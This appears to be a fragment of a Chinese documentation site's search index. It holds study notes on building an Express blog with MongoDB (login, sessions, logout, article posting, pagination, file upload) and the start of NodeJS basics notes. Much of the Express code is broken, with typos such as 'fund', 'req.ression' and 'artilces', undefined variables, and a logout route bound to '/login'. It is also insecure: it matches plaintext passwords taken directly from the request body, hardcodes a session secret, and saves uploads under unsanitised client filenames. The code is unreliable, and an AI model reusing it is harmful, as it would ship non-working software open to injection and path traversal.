{\n  var data = {\n    username: req.body.username,\n    password: req.body.password,\n  };\n  // TODO\uff1a\u6570\u636e\u6709\u6548\u6027\u9a8c\u8bc1\n  model.connect(function(db) {\n    db.collection('users').fund(data).toArray(function(err, docs) {\n      // \u767b\u5f55\u9519\u8bef\uff0c\u91cd\u5b9a\u5411\u5230\u767b\u5f55\u9875\n      if (err) {\n        logger.err(err);\n        res.redirect('./login');\n      } else {\n        // \u7528\u6237\u4fe1\u606f\u5b58\u5728\uff0c\u91cd\u5b9a\u5411\u5230\u9996\u9875\n        if (docs.length &gt; 0) {\n          res.redirect('/');\n        } else {\n          // \u7528\u6237\u4fe1\u606f\u4e0d\u5b58\u5728\uff0c\u91cd\u5b9a\u5411\u5230\u767b\u5f55\u9875\n          res.redirect('./login');\n        }\n      }\n    }\n  });\n})\n</code></pre>"},{"location":"other/express%E5%9B%BE%E4%B9%A6%E9%A6%86%E9%A1%B9%E7%9B%AE/#5-session","title":"\u8bfe\u65f65  \u767b\u5f55\u62e6\u622a session","text":"<p>\u4f7f\u7528 express-session \u4fdd\u5b58\u767b\u5f55\u4fe1\u606f\uff08\u7c7b\u4f3c\u7684\u662f token\uff09</p> <p>\u5728\u5165\u53e3\u4e2d\uff0c\u6dfb\u52a0\u4e2d\u95f4\u4ef6</p> <pre><code>var session = require('express-session');\n\n// \u4e2d\u95f4\u4ef6\uff1a\u5b98\u65b9\u9ed8\u8ba4\u914d\u7f6e\u5373\u53ef\napp.use(session({\n  secret: 'xzxzxz',\n  resave: false,\n  saveUninitialized: true,\n  cookie: {\n    secure: true,\n    maxAge: 1000 * 60 * 30, // \u8bbe\u7f6e\u8fc7\u671f\u65f6\u95f4\n  },\n});\n\n// \u767b\u5f55\u62e6\u622a\napp.get('*', function(req, res, next) {\n  // \u4ece session \u4e2d\u62ff\u5230\u7528\u6237\u540d\n  var username = req.ression.username;\n  // \u5982\u679c\u62ff\u4e0d\u5230\u7528\u6237\u540d\uff0c\u91cd\u5b9a\u5411\u5230\u767b\u5f55\u9875\n  if (path !== '/login' &amp;&amp; path !== '/regist' &amp;&amp; !username) {\n    res.redirect('/login');\n  }\n  next();\n})\n</code></pre> <p>\u7136\u540e\uff0c\u5f53\u7528\u6237\u6210\u529f\u767b\u5f55\u540e\uff0c\u589e\u52a0 session</p> <pre><code>router.post('./login', function(req, res, next) {\n  var data = {\n    username: req.body.username,\n    password: req.body.password,\n  };\n  model.connect(function(db) {\n    db.collection('users').fund(data).toArray(function(err, docs) {\n      if (err) {\n        logger.err(err);\n        res.redirect('./login');\n      } else {\n        if (docs.length &gt; 0) {\n          // \u65b0\u589e\uff1a\u7528\u6237\u4fe1\u606f\u5b58\u50a8\u5230 session \n          req.session.username = data.username;\n          res.redirect('/');\n        } else {\n          res.redirect('./login');\n        }\n      }\n    }\n  });\n})\n</code></pre>"},{"location":"other/express%E5%9B%BE%E4%B9%A6%E9%A6%86%E9%A1%B9%E7%9B%AE/#6","title":"\u8bfe\u65f66    \u9000\u51fa\u767b\u5f55","text":"<p>\u9996\u5148\u5b8c\u6210\u4e00\u4e2a\u524d\u7aef\u516c\u5171\u90e8\u5206\u7684 nav \u5bfc\u822a\u680f</p> <pre><code>&lt;div&gt;\n  &lt;a href=\"/\"&gt;\n    &lt;img src=\"/images/home.png\" alt=\"\u9996\u9875\"&gt;\n  &lt;/a&gt;\n  &lt;span&gt;{% username %}&lt;/span&gt;\n  &lt;a href=\"/write\"&gt;\u5199\u6587\u7ae0&lt;/a&gt;\n  &lt;a href=\"/users/logout\"&gt;\u9000\u51fa&lt;/a&gt;\n&lt;/div&gt;\n</code></pre> <p>\u9996\u9875\u5f15\u5165\u5bfc\u822a\u680f\uff08\u9700\u8981\u4f20\u53c2\uff09</p> <pre><code>&lt;html&gt;\n    &lt;head&gt;\n    &lt;title&gt;\u9996\u9875&lt;/title&gt;\n    &lt;%- include head %&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;%- include('nav', { username:username }) %&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>\u9000\u51fa\u767b\u5f55</p> <pre><code>router.get('/login', function(req, res, next) {\n  req.session.username = null;\n  res.redirect('./login');\n});\n</code></pre>"},{"location":"other/express%E5%9B%BE%E4%B9%A6%E9%A6%86%E9%A1%B9%E7%9B%AE/#7","title":"\u8bfe\u65f67    \u6587\u7ae0\u53d1\u5e03\u529f\u80fd","text":"<p>Article.js</p> <pre><code>// api \u589e\u52a0\u6587\u7ae0\nrouter.post('/add', function(req, res, next) {\n  const { title, content, username } = req.body;\n  var data = {\n    title,\n    content,\n    id: Date.now(),\n    username: username || 'unknown',\n  }\n  model.connect(function(db) {\n    db.collection('articles').insertOne(data, function(err, ret) {\n      if (err) {\n        console.log('publish error', err);\n        res.redirect('/write');\n      } else {\n        res.redirect('/');\n      }\n    })\n  })\n});\n</code></pre> <p>\u5bf9\u5e94\u9875\u9762\u6a21\u677f</p> <pre><code>&lt;head&gt;\n  &lt;title&gt;\u5199\u6587\u7ae0&lt;/title&gt;\n  &lt;%- include head %&gt;\n&lt;/head&gt;\n&lt;body&gt;\n  &lt;%- inlcude('bar', { username: username }) %&gt;\n  &lt;div class=\"article\"&gt;\n    &lt;form action=\"/article/add\"&gt;\n      &lt;input type=\"text\" name=\"title\" placeholder=\"\u8bf7\u8f93\u5165\u6587\u7ae0\u6807\u9898\" value=\"\"/&gt;\n      &lt;textarea name=\"content\"&gt;&lt;/textarea&gt;\n      &lt;input type=\"submit\" value=\"\u53d1\u5e03\"/&gt;\n    &lt;/form&gt;\n  &lt;/div&gt;\n  &lt;!-- \u5f15\u5165\u7b2c\u4e09\u65b9\u7f16\u8f91\u5668\u63d2\u4ef6 xheditor --&gt;\n  &lt;script&gt;\n    $('#elm1').xheditor({\n      tools: 'full',\n      skin: 'default',\n    });\n  &lt;/script&gt;\n&lt;/body&gt;\n</code></pre>"},{"location":"other/express%E5%9B%BE%E4%B9%A6%E9%A6%86%E9%A1%B9%E7%9B%AE/#8","title":"\u8bfe\u65f68    \u6587\u7ae0\u5217\u8868","text":"<p>\u6b63\u5e38\u7684\u60c5\u51b5\u662f\uff0c\u524d\u7aef\u83b7\u53d6\u67d0\u4e00\u4e2a\u9875\u9762\u7684\u6570\u636e\uff0c\u4e0d\u5e94\u8be5\u83b7\u53d6\u5168\u90e8\u7684\u6587\u7ae0</p> <pre><code>&lt;div class=\"list\"&gt;\n  &lt;% list.map(function(item, index)) { %&gt;\n    &lt;div class=\"row\"&gt;\n      &lt;span&gt;\u5e8f\u53f7&lt;/span&gt;\n      &lt;span&gt;\u4f5c\u8005&lt;/span&gt;\n      &lt;span&gt;\u6807\u9898&lt;/span&gt;\n      &lt;span&gt;\u65f6\u95f4&lt;/span&gt;\n      &lt;span&gt;\n        &lt;a href=\"/edit\"&gt;\u7f16\u8f91&lt;/a&gt;\n        &lt;a href=\"article/delete?id=&lt;%-item.id%&gt;&amp;page=&lt;%data.currrentPage%&gt;\"&gt;\u5220\u9664&lt;/a&gt;\n      &lt;/span&gt;\n    &lt;/div&gt;\n  &lt;% }); %&gt;\n\n  &lt;!-- \u5206\u9875\u5668 --&gt;\n  &lt;div class=\"pages\"&gt;\n    &lt;% for(let i = 0; i &lt; data.total; i++) { %&gt;\n      &lt;a href=\"\"&gt;&lt;%- i %&gt;&lt;/a&gt;\n    &lt;% } %&gt;\n  &lt;/div&gt;\n&lt;/div&gt;\n</code></pre> <pre><code>router.get('/', function(req, res, next) {\n  var username = req.session.username || '';\n\n  var data = {\n    total: 0,\n    curPage: 1,\n    list: [],\n  };\n  var pageSize = 2;\n\n  model.connect(function(db) {\n    // 1 \u67e5\u8be2\u6240\u6709\u6587\u7ae0\n    db.collection('articles').find().toArray(function(err, docs) {\n      console.log('\u6587\u7ae0\u5217\u8868', err);\n      var list = docs;\n      list.map(function(ele, index) {\n        ele['time'] = moment(ele.id).format('YYYY_MM_DD HH:mm:ss')\n      })\n      data.total = Math.ceil(docs.length / pageSize);\n      // 2 \u67e5\u8be2\u5f53\u524d\u9875\u7684\u6587\u7ae0\u5217\u8868\n      model.connect(function(db) {\n        db.collection('artilces').find().sort({ _id: -1 }).limit(pageSize).skip((page - 1) * pageSize)\n      })\n      data.list = docs;\n      res.render('index', { username, data: data });\n    })\n  })\n})\n\n// \u9605\u8bfb\u6587\u7ae0\uff0c\u7f16\u8f91\u6587\u7ae0\n// \u5982\u679c\u5df2\u6709\u6587\u4ef6ID\uff0c\u5c31\u662f\u7f16\u8f91\u6587\u7ae0\uff0c\u5982\u679c\u6ca1\u6709\u6587\u4ef6 ID \u90a3\u5c31\u662f\u9884\u89c8\u6587\u7ae0\nrouter.get('/write', function(req, res, next) {\n  // username, id, page\n  model.connect(function(db) {\n\n  })\n  res.render('write', { username })\n})\n</code></pre>"},{"location":"other/express%E5%9B%BE%E4%B9%A6%E9%A6%86%E9%A1%B9%E7%9B%AE/#9","title":"\u8bfe\u65f69    \u5206\u9875\u67e5\u8be2","text":""},{"location":"other/express%E5%9B%BE%E4%B9%A6%E9%A6%86%E9%A1%B9%E7%9B%AE/#10","title":"\u8bfe\u65f610    \u5220\u9664\u6587\u7ae0","text":""},{"location":"other/express%E5%9B%BE%E4%B9%A6%E9%A6%86%E9%A1%B9%E7%9B%AE/#11","title":"\u8bfe\u65f611    \u4fee\u6539\u6587\u7ae0","text":"<pre><code>// \u5199\u6587\u7ae0\nrouter.get('/write', function(req, res, next) {\n  res.render('write', {});\n});\n</code></pre>"},{"location":"other/express%E5%9B%BE%E4%B9%A6%E9%A6%86%E9%A1%B9%E7%9B%AE/#12","title":"\u8bfe\u65f612    \u6587\u7ae0\u8be6\u60c5\u9875","text":""},{"location":"other/express%E5%9B%BE%E4%B9%A6%E9%A6%86%E9%A1%B9%E7%9B%AE/#13","title":"\u8bfe\u65f613    \u6587\u4ef6\u4e0a\u4f20","text":"<pre><code>// \u6587\u4ef6\u4e0a\u4f20\uff0c\u501f\u7528\u4e86\u7b2c\u4e09\u65b9\u7684\u5de5\u5177\u5b9e\u73b0\u524d\u7aef\u4e0a\u4f20\n// \u540e\u7aef\u9700\u8981\u589e\u52a0\n\nrouter.post('/upload', function(req, res, next) {\n  let form = new multiparty.Form();\n  form.parse(req, function(err, fields, files) {\n    console.log(files);\n    var file = files.filedata[0];\n    // \u8fd9\u91cc\u628a\u4e0a\u4f20\u8def\u5f84\u83b7\u53d6\u5230\n    var rs = fs.createReadStream(file.path);\n    // \u8fd9\u662f\u670d\u52a1\u7aef\u5b58\u50a8\u7684\u8def\u5f84\n    var newPath = '/uploads/' + file.originalFilename;\n    var ws = fs.createWriteStream('./public' + newPath);\n    // \u7136\u540e\u628a\u672c\u5730\u6587\u4ef6\u5199\u5165\u670d\u52a1\u5668\uff1f\n  })\n})\n</code></pre>"},{"location":"other/express%E5%9B%BE%E4%B9%A6%E9%A6%86%E9%A1%B9%E7%9B%AE/#14","title":"\u8bfe\u65f614    \u9879\u76ee\u603b\u7ed3","text":""},{"location":"other/nodeJS-basic-upguigu/","title":"NodeJS \u57fa\u7840","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 21349  \u9605\u8bfb43\u5206\u949f</p> <p>\u5c1a\u7845\u8c37\u89c6\u9891\u662f2018\u5e74\u7684\uff0c\u57fa\u4e8e nodeJS 6 \u7248\u672c\uff08\u4e24\u5929\u8bfe\u7a0b\uff09</p> <p>2021-10-31\u2014\u20142021-11-05\u5b66\u4e60\uff0cnodeJS \u4e3b\u8981\u662f12-16\u7248\u672c\uff0c\u53ef\u80fd\u90e8\u5206\u529f\u80fd\u4e0d\u4e00\u6837\uff0c\u6700\u540e\u4ee5\u5b98\u7f51\u4e3a\u51c6\u3002</p>"},{"location":"other/nodeJS-basic-upguigu/#01window","title":"01.Window \u547d\u4ee4\u884c","text":"<p>cmd \u4ecb\u7ecd\uff08\u7ec8\u7aef shell\uff09</p> <p>Windows \u76ee\u5f55\u7cfb\u7edf\u4ecb\u7ecd\uff08\u6ce8\u610f\u662f\u53cd\u659c\u6760\uff09</p> <pre><code>C:\\Users\\Michael\n</code></pre> <p>\u5e38\u7528\u6307\u4ee4\uff0c\u548c linux \u76f8\u540c\u7684\u6307\u4ee4\uff08cd \uff09\uff0c\u4e0d\u4e00\u6837\u7684\u5982\u4e0b</p> <pre><code>dir === ls \nmd === mkdir\nrd === rm\n\u6253\u5f00\u5176\u4ed6\u76d8\uff0c\u76f4\u63a5 D:\n\u76f4\u63a5\u8f93\u5165\u6587\u4ef6\u540d hello.txt \u5c31\u7528\u9ed8\u8ba4\u7a0b\u5e8f\u53ef\u4ee5\u6253\u5f00\u6587\u4ef6\n</code></pre> <p>\u73af\u5883\u53d8\u91cf\uff1apath\uff1a\u6211\u4eec\u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\u6216\u8005\u7a0b\u5e8f\uff0c\u9700\u8981\u5148\u8fdb\u5165\u6307\u5b9a\u7684\u76d8\u548c\u6587\u4ef6\u5939\u5185\u90e8\uff0c\u5f88\u9ebb\u70e6\u3002\u6211\u4eec\u5e0c\u671b\u5728\u5168\u5c40\u7684\u73af\u5883\u4e2d\u53ef\u4ee5\u76f4\u63a5\u6253\u5f00\u8fd9\u4e2a\u6587\u4ef6\u6216\u8005\u7a0b\u5e8f\u3002\u90a3\u4e48\u5c31\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\uff0c\u76f8\u5f53\u4e8e\u628a\u8fd9\u4e2a\u6587\u4ef6\u7684\u94fe\u63a5\uff0c\u8bbe\u7f6e\u5728\u5168\u5c40\u73af\u5883\u4e2d\u3002\u4f8b\u5982\uff1a</p> <pre><code>path: c:\\Program\\cmd.exe;d:\\Program/java.exe;c:\\User\\Desktop\\test.txt\n</code></pre> <p>\u64cd\u4f5c\uff1a\u8ba1\u7b97\u673a\u5c5e\u6027-\u9ad8\u7ea7\u7cfb\u7edf\u8bbe\u7f6e-\u73af\u5883\u53d8\u91cf-\u7528\u6237\u73af\u5883\u53d8\u91cf-\u66f4\u6539 path \u7684\u5c5e\u6027\uff08\u683c\u5f0f\u662f\u5206\u53f7\u9694\u5f00\u7684\u8def\u5f84\uff09-\u4fdd\u5b58</p> <p>\u6539\u5b8c\u73af\u5883\u53d8\u91cf\uff0c\u9700\u8981\u91cd\u542f CMD \u7a97\u53e3\u3002\u5f53\u6211\u4eec\u5728 cmd \u8f93\u5165\u547d\u4ee4\u65f6\uff0c\u9996\u5148\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u627e\u8fd9\u4e2a\u6587\u4ef6\u3002\u5982\u679c\u627e\u4e0d\u5230\uff0c\u5728\u73af\u5883\u53d8\u91cf\u4e2d\u627e\u6587\u4ef6\u3002\u5982\u679c\u8fd8\u627e\u4e0d\u5230\u5c31\u62a5\u9519\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u5c06\u7ecf\u5e38\u8bbf\u95ee\u7684\u7a0b\u5e8f\uff0c\u6dfb\u52a0\u5230 path\uff0c\u5c31\u53ef\u4ee5\u5728\u4efb\u610f\u4f4d\u7f6e\u8bbf\u95ee\u4e86</p>"},{"location":"other/nodeJS-basic-upguigu/#02","title":"02.\u8fdb\u7a0b\u548c\u7ebf\u7a0b","text":"<p>\u8fdb\u7a0b\uff1a\u8ba1\u7b97\u673a\u4e2d\u72ec\u7acb\u7684\u8fd0\u884c\u73af\u5883\uff1b\u4e0d\u540c\u8fdb\u7a0b\u4f7f\u7528\u4e0d\u540c\u7684\u5185\u5b58\u7a7a\u95f4\uff1b\u8fdb\u7a0b\u4e3a\u7a0b\u5e8f\u7684\u8fd0\u884c\u63d0\u4f9b\u73af\u5883\uff08\u53ef\u80fd\u8fdb\u7a0b\u5185\u90e8\u6ca1\u6709\u7a0b\u5e8f\u8fd0\u884c\uff0ccpu \u662f0\uff0c\u8fdb\u7a0b\u6302\u8d77\uff09\uff1b\u76f8\u5f53\u4e8e\u8f66\u95f4</p> <p>\u7ebf\u7a0b\uff1a\u8ba1\u7b97\u673a\u4e2d\u6700\u5c0f\u7684\u8ba1\u7b97\u5355\u4f4d\uff1b\u8d1f\u8d23\u6267\u884c\u8fdb\u7a0b\u4e2d\u7684\u7a0b\u5e8f\uff1b\u76f8\u5f53\u4e8e\u8f66\u95f4\u4e2d\u7684\u5de5\u4eba</p> <p>\u5355\u7ebf\u7a0b\uff1a\u4e00\u4e2a\u4efb\u52a1\u7531\u4e00\u4e2a\u4eba\u5b8c\u6210\uff08\u4e00\u4e2aCPU\uff09JS</p> <p>\u591a\u7ebf\u7a0b\uff1a\u4e00\u4e2a\u4efb\u52a1\u7531\u591a\u4e2a\u4eba\u5b8c\u6210\uff08\u591a\u4e2aCPU\uff09Java \u7b49\u8bed\u8a00</p> <p>\u4e3a\u4ec0\u4e48\u6d4f\u89c8\u5668 JS \u662f\u5355\u7ebf\u7a0b\uff1f\u56e0\u4e3a\u6d4f\u89c8\u5668\u6e32\u67d3\u5f15\u64ce\u548c JS V8 \u5f15\u64ce\u53ef\u80fd\u540c\u65f6\u4fee\u6539\u9875\u9762\uff08DOM\u6216\u8005CSS\uff0c\u591a\u7ebf\u7a0b\u4f1a\u6df7\u4e71\uff09\u6240\u4ee5\u662f\u5355\u7ebf\u7a0b\u6267\u884c</p>"},{"location":"other/nodeJS-basic-upguigu/#03node","title":"03.node\u7b80\u4ecb","text":"<p>JS \u64cd\u4f5c\u6d4f\u89c8\u5668\uff1bNodeJS \u540e\u7aef\u670d\u52a1\u5668\u548c\u7cfb\u7edf\u4ea4\u4e92</p> <p>NodeJS \u662f\u80fd\u591f\u5728\u670d\u52a1\u5668\u7aef\u8fd0\u884cJS\u7684\u8fd0\u884c\u73af\u5883\u3002\u4f7f\u7528 V8 \u5f15\u64ce\u5f00\u53d1\uff0c\u4e8b\u4ef6\u9a71\u52a8\uff08\u5f02\u6b65\u64cd\u4f5c\uff09\uff1b\u975e\u963b\u585e\uff0c\u5f02\u6b65 I/O\u6a21\u5f0f\u63d0\u9ad8\u6027\u80fd\u3002</p> <p>NodeJS \u53d1\u5c55\u53f2\uff08\u4e86\u89e3\uff09\uff1a\u521b\u5efa\u8005 Ryan Dahl \u662f\u7ebd\u7ea6\u7f57\u5f7b\u65af\u7279\u5927\u5b66\u6570\u5b66\u7cfb\u535a\u58eb\uff0c2006\u5e74\u9000\u5b66\u540e\u5230\u667a\u529b\u53bb\u65c5\u884c\uff0c\u7136\u540e\u505a\u7801\u519c\u8d5a\u94b1\uff1b\u6b64\u65f6 Ruby on Rails \u5f88\u706b\uff0c\u4f46\u662f\u6709\u6027\u80fd\u95ee\u9898\uff08\u6240\u4ee5\u5f88\u591a\u548c Ruby Rails \u7c7b\u4f3c\uff09</p> <p>node \u7248\u672c\uff08\u4e86\u89e3\uff09\uff1a\u4ece 0.x \u76f4\u63a5\u8df3\u5230 4.0 \u7248\u672c\uff1b\u5927\u7248\u672c\u4e2d\uff0c\u5076\u6570\u7248\u672c\u662f\u7a33\u5b9a\u7248\uff0c\u5947\u6570\u7248\u672c\u662f\u5f00\u53d1\u7248\uff08\u6240\u4ee5\u73b0\u5728\u4ece 16 \u5347\u7ea7\u523018\u7248\u672c\uff0c17\u7248\u672c\u662f\u6d4b\u8bd5\u5f00\u53d1\u7684\uff09</p> <p>\u7f51\u7edc\u8bf7\u6c42\u6b65\u9aa4\uff1a\u7528\u6237\u53d1\u51fa\u8bf7\u6c42\uff0c\u670d\u52a1\u5668\u63a5\u53d7\u8bf7\u6c42\uff0c\u670d\u52a1\u5668\u67e5\u8be2\u6570\u636e\u5e93\u5e76\u83b7\u53d6\u6570\u636e\uff0c\u670d\u52a1\u5668\u53d1\u51fa\u54cd\u5e94\u3002\u540e\u7aef\u53ef\u4ee5\u63d0\u9ad8\u670d\u52a1\u7aef\u7684\u4ee3\u7801\uff0c\u53ef\u4ee5\u63d0\u9ad8\u670d\u52a1\u5668\u7684\u5e26\u5bbd\uff0c\u4f46\u662f\u548c\u6570\u636e\u5e93 i/o \u7684\u901f\u5ea6\u662f\u6709\u9650\u7684\uff0c\u9ad8\u5e76\u53d1\u4f1a\u963b\u585e\u3002</p> <p>\u4f20\u7edf\u670d\u52a1\u5668\u662f\u591a\u7ebf\u7a0b\u7684\uff0c\u6bcf\u4e00\u4e2a\u8bf7\u6c42\u53d1\u51fa\uff0c\u4f1a\u5f00\u8f9f\u4e00\u4e2a\u7ebf\u7a0b\uff0c\u7136\u540e\u8bf7\u6c42\u6570\u636e\u5e93\uff08\u78c1\u76d8\uff09\uff0c\u540c\u65f6\u8fd9\u4e2a\u7ebf\u7a0b\u4fdd\u7559\uff1b\u78c1\u76d8I/O\u540e\uff0c\u8fd9\u4e2a\u7ebf\u7a0b\u4f1a\u53d1\u51fa\u54cd\u5e94\uff0c\u5ba2\u6237\u7aef\u6536\u5230\u3002\u5f53\u9ad8\u5e76\u53d1\u65f6\uff0c\u670d\u52a1\u5668\u5f00\u542f\u591a\u4e2a\u7ebf\u7a0b\uff0c\u4f46\u662f i/o \u65f6\u95f4\u8f83\u6162\uff0c\u4f1a\u9020\u6210\u591a\u7ebf\u7a0b\u963b\u585e\uff0c\u670d\u52a1\u5668\u6027\u80fd\u4e0b\u964d\u3002</p> <p>nodeJS \u662f\u5355\u7ebf\u7a0b\uff0c\u4f46\u662f\u5728\u540e\u53f0\u62e5\u6709\u4e00\u4e2a I/O \u7ebf\u7a0b\u6c60\uff0c\u6ca1\u6709\u4e0a\u8ff0\u591a\u7ebf\u7a0b\u963b\u585e\u7684\u95ee\u9898\uff0c\u6700\u521d\u4e3a\u4e86\u89e3\u51b3\u670d\u52a1\u5668\u7aef\u591a\u7ebf\u7a0bi/o\u963b\u585e\u95ee\u9898\uff08webJS\uff09\uff1b\u6700\u540e\u529f\u80fd\u8d8a\u6765\u8d8a\u591a\uff0c\u6539\u540d\u4e3a nodeJS\uff08node\u8282\u70b9\u53ef\u4ee5\u4e0d\u65ad\u6269\u5c55\uff09\u3002</p> <p>\u56e0\u4e3a\u662f\u5355\u7ebf\u7a0b\uff0c\u6027\u80fd\u8fd8\u4e5f\u6709\u5c40\u9650\u6027\uff1b\u73b0\u5728\u9ad8\u5e76\u53d1\u5904\u7406\u8fd8\u662f Java \u7b49\u8bed\u8a00\uff0c\u9664\u975e NodeJS \u591a\u670d\u52a1\u5668\u5206\u5e03\u5f0f\uff08nodeJS\u670d\u52a1\u5668\u6210\u672c\u6bd4\u8f83\u4f4e\uff0c\u6240\u4ee5\u53ef\u4ee5\u505a\u591a\u4e2a\u670d\u52a1\u5668\uff09\u3002\u73b0\u5728\u5728\u670d\u52a1\u5668\u7aef\u7684\u5e94\u7528\uff08\u4f8b\u5982\u6dd8\u5b9d\uff09\uff0c\u4e3b\u8981\u505a\u4e2d\u95f4\u5c42\u6e32\u67d3HTML\u9875\u9762 SSR\uff08JAVA\u540e\u7aef\u5b9e\u73b0\u6570\u636e\u5e93\u4ea4\u4e92\uff09\u3002nodeJS \u4f5c\u8005\u4e5f\u63d0\u5230 Go \u8bed\u8a00\u670d\u52a1\u5668\u7684\u6027\u80fd\u66f4\u9ad8\u3002</p> <p>\u4e3b\u8981\u7528\u9014\uff1aweb Rest-API\uff1b\u591a\u4eba\u6e38\u620f\uff1b\u591a\u5ba2\u6237\u7aef\u53ca\u65f6\u901a\u4fe1\uff08socket-io\uff09\u8de8\u57df\uff1b\u670d\u52a1\u7aef\u8bf7\u6c42\u7b49</p>"},{"location":"other/nodeJS-basic-upguigu/#04nodejs","title":"04.\u4f7f\u7528node\u6267\u884cjs\u6587\u4ef6","text":"<p>\u53ef\u4ee5\u5728 cmd \u4e2d\u8f93\u5165 node \u6253\u5f00\u4ea4\u4e92\u5f0f\u7a97\u53e3\uff0c\u7136\u540e\u8f93\u5165\u4ee3\u7801\uff08\u6ce8\uff1a\u6d4b\u8bd5\u53ef\u4ee5\u8f93\u5165 es6 \u7684\u4ee3\u7801\uff09</p> <p>\u53ef\u4ee5\u5728\u672c\u5730\u7f16\u5199\u597d test.js \u7136\u540e\u8fd0\u884c node test.js \u6267\u884c\u5bf9\u5e94\u7684\u4ee3\u7801\uff08\u7c7b\u4f3c Python \u6267\u884c\uff09\u901a\u5e38\u91c7\u7528\u540e\u4e00\u79cd\u6267\u884c\u65b9\u6cd5</p>"},{"location":"other/nodeJS-basic-upguigu/#05nodeide","title":"05.node\u6574\u5408IDE","text":"<p>\u5728 VSCode \u4e2d\uff0c\u7f16\u5199\u597d JS \u4ee3\u7801\uff0c\u76f4\u63a5\u70b9\u51fb\u5de6\u4fa7\u7684\u8fd0\u884c\u6309\u94ae\uff0c\u9009\u62e9 nodeJS \u5373\u53ef\u8fd0\u884c\u3002\u5176\u4ed6 IDE \u57fa\u672c\u7c7b\u4f3c\uff0c\u8bbe\u7f6e\u4e0d\u540c\u7684\u8fd0\u884c\u7a0b\u5e8f\u5373\u53ef\u3002</p>"},{"location":"other/nodeJS-basic-upguigu/#06","title":"06.\u6a21\u5757\u5316\u7b80\u4ecb","text":"<p>\u6a21\u5757\u5316\u6709\u52a9\u4e8e\u540e\u671f\u7ef4\u62a4\uff0c\u4ee3\u7801\u590d\u7528\u7b49\uff1b\u6a21\u5757\u5316\u5bf9\u4e8e\u540e\u671f\u7684\u7ef4\u62a4\u6bd4\u8f83\u597d\uff1b</p> <p>\u6a21\u5757\u5316\u7684\u95ee\u9898\uff1a\u6a21\u5757\u5316\u6709\u987a\u5e8f\uff08\u53ef\u80fd\u5f15\u5165\u6a21\u5757\u7684\u5148\u540e\u548c\u6a21\u5757\u6709\u5173\uff1b\u67d0\u4e9b\u63d2\u4ef6\u5fc5\u987b\u540e\u9762\u5f15\u5165\uff09</p> <p>ECMAScript \u7684\u7f3a\u9677\uff1a\u6ca1\u6709\u6a21\u5757\u7cfb\u7edf\uff1b\u6ca1\u6709\u5b98\u65b9\u7684\u89c4\u8303\uff08\u7f3a\u4e4f\u5b98\u65b9\u7ba1\u7406\u7cfb\u7edf\uff09\uff1b\u6807\u51c6\u5e93\u8f83\u5c11\uff08jquery react \u90fd\u4e0d\u662f\u5b98\u65b9\u7684\u5e93\uff09\uff1b\u6ca1\u6709\u6807\u51c6\u63a5\u53e3\u3002</p> <p>commonJS\uff1a\u4e3a\u4e86\u8ba9\u4ee3\u7801\u5728\u5404\u4e2a\u5e73\u53f0\u4e0a\u90fd\u80fd\u6b63\u5e38\u8fd0\u884c\uff0c\u6240\u4ee5\u5236\u5b9a\u4e86 commonjs \u89c4\u8303\uff08cjs\uff09\u3002\u4e3b\u8981\u5305\u62ec\uff1a\u6a21\u5757\u5f15\u7528\uff08require('./math.js')\uff09\uff1b\u6a21\u5757\u5b9a\u4e49\uff08\u5355\u72ec\u7684JS\u6587\u4ef6\uff0cexports \u5bfc\u51fa\u5185\u90e8\u53d8\u91cf\uff0cexports.x = 100\uff09\uff1b\u6a21\u5757\u6807\u8bc6\u3002</p> <p>\u6bcf\u4e00\u4e2a\u6a21\u5757\u6709\u4e00\u4e2a\u81ea\u5df1\u7684\u4f5c\u7528\u57df\uff08\u7c7b\u4f3c\u51fd\u6570\u4f5c\u7528\u57df\uff09\uff1b\u5728\u6a21\u5757\u5185\u90e8\u5b9a\u4e49\u7684\u53d8\u91cf\uff0c\u4e0d\u4f1a\u5728\u5168\u5c40\u73af\u5883\u4e2d\u8bbf\u95ee\u5230\uff1b\u6240\u4ee5\u5e0c\u671b\u66b4\u9732\u7684\u51fd\u6570\u5fc5\u987b exports \u51fa\u53bb\u3002</p>"},{"location":"other/nodeJS-basic-upguigu/#07","title":"07.\u6a21\u5757\u5316\u8be6\u89e3","text":"<p>nodeJS \u4e2d\u901a\u8fc7 require \u5bfc\u5165\u5916\u90e8\u7684\u6a21\u5757\uff1b\u53ef\u4ee5\u4f20\u9012\u4e00\u4e2a\u6587\u4ef6\u7684\u8def\u5f84\uff08\u76f8\u5bf9\u8def\u5f84\u5fc5\u987b\u4ee5 . \u6216\u8005 .. \u5f00\u5934\uff09\u4f5c\u4e3a\u53c2\u6570\uff0cnode \u4f1a\u81ea\u52a8\u5bfc\u5165\u5916\u90e8\u6a21\u5757\u3002require \u5f15\u5165\u6a21\u5757\u540e\uff0c\u51fd\u6570\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\uff08\u5c31\u662f\u5f15\u5165\u7684\u6a21\u5757\uff09\u3002</p> <p>\u6a21\u5757\u6807\u8bc6\uff1a\u5c31\u662f\u5982\u4f55\u5f15\u5165\u6a21\u5757\u3002\u53ef\u4ee5\u5206\u4e3a NodeJS \u5f15\u64ce\u539f\u751f\u7684\u6838\u5fc3\u6a21\u5757\uff08fs, os\uff09\u6216\u8005\u6587\u4ef6\u4e2d\u81ea\u5df1\u5b9a\u4e49\u7684\u6a21\u5757\u3002\u539f\u751f\u7684\u6a21\u5757\u76f4\u63a5\u5f15\u5165\u5373\u53ef\uff1b\u6587\u4ef6\u6a21\u5757\u9700\u8981\u52a0\u4e0a\u76f8\u5bf9\u8def\u5f84\u3002</p> <p>\u5168\u5c40\u5bf9\u8c61\uff1a\u6d4f\u89c8\u5668\u4e2d\u662f window\uff0cNodeJS \u662f global\u3002\u5168\u5c40\u521b\u5efa\u7684\u53d8\u91cf\u548c\u51fd\u6570\u90fd\u6302\u8f7d\u5728 global \u4e0a\u3002nodejs \u6700\u597d\u662f\u6a21\u5757\u5316\uff0c\u907f\u514d\u5168\u5c40\u4e2d\u6302\u8f7d\u3002</p> 